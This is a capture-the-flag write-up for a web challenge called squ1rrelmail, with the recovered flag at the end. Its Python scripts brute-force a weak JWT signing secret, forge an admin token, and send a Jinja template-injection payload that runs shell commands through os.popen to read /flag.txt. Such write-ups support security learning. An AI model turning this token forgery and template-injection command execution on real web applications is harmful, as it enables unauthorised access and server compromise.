# squ1rrelmail

## Challenge Summary
- Given:
- Given: a live web app at `https://squ1rrelmail.squ1rrel.dev` and no downloadable starter files.
- Goal: recover the flag from the seized squirrel messaging service.
- Constraints: everything had to be derived from the live app surface.
## Initial Recon / Triage
- Observations:
- Observations:
	- The root page was a takedown notice with a faint moderator hint and an HTML comment mentioning `/login`.
	- `POST /login` immediately returned a JWT cookie and redirected to `/dashboard`.
	- The issued token contained a `role` claim and used `HS256`.
- File identification:
	- No challenge files were provided beyond the live URL, so the workspace artifacts are all locally created during solving.
- Entry points:
	- `/login`
	- `/dashboard`
	- the hidden admin redirect target `/acorn-inbox`
## Hypotheses & Approach
- Hypothesis 1:
- Hypothesis 1: the JWT implementation was weak and the `role` claim could likely be forged.
- Hypothesis 2: any admin-only feature would probably contain either direct flag disclosure or a second bug such as SSTI/XSS/command injection.
## Execution Steps (Reproducible)

### Stage 1
Commands:
```bash
# commands here
python3 - <<'PY'
import requests

base = 'https://squ1rrelmail.squ1rrel.dev'
r = requests.get(base, timeout=20)
print(r.text)

r = requests.get(base + '/login', timeout=20)
print(r.text)

r = requests.post(base + '/login', data={'username': 'test'}, timeout=20, allow_redirects=False)
print(r.headers.get('set-cookie'))
PY

Results:
- 
- The root page included a hidden note to disable `/login` before public takedown.
- `/login` accepted a username only and set a JWT cookie.
- Decoding the token showed claims like `{"username":"test","role":"user",...}` with algorithm `HS256`.
### Stage 2
Commands:
```bash
# commands here
python3 - <<'PY'
import base64
import hashlib
import hmac

msg = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImV4cCI6MTc3NjYxOTU3MH0'
sig = 'mHiegFZHYC05M_OmcF0Fl4WaDp_1pzHF9vRZlwyB8VM'

for word in ['secret', 'password', 'squirrel', 'acorn']:
		digest = hmac.new(word.encode(), msg.encode(), hashlib.sha256).digest()
		guess = base64.urlsafe_b64encode(digest).decode().rstrip('=')
		if guess == sig:
				print('secret:', word)
PY

Results:
- 
- The signing secret was the weak, guessable string `squirrel`.
- A valid forged admin token redirected `/dashboard` to `/acorn-inbox`.

### Stage 3
Commands:
```bash
python3 - <<'PY'
import requests
import jwt
from urllib.parse import quote

base = 'https://squ1rrelmail.squ1rrel.dev'
token = jwt.encode({'username': 'test', 'role': 'admin', 'exp': 2176619570}, 'squirrel', algorithm='HS256')

payload = "{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}"
r = requests.get(base + '/acorn-inbox?acorn=' + quote(payload), cookies={'token': token}, timeout=20)
print(r.text)
PY
## Artifacts Produced

Results:
- `/acorn-inbox` was vulnerable to Jinja SSTI through the `acorn` query parameter.
- `{{7*7}}` evaluated to `49`, confirming template execution.
- Using `cycler.__init__.__globals__.os.popen(...)` gave command execution and allowed direct reading of `/flag.txt`.
- `artifacts/`

- `artifacts/solve.py` — compact exploit script that forges an admin JWT and reads `/flag.txt` through the SSTI sink.
```
flag_here
```
squ1rrel{acorns_w3r3_n3v3r_m3ant_t0_b3_s3cr3t}
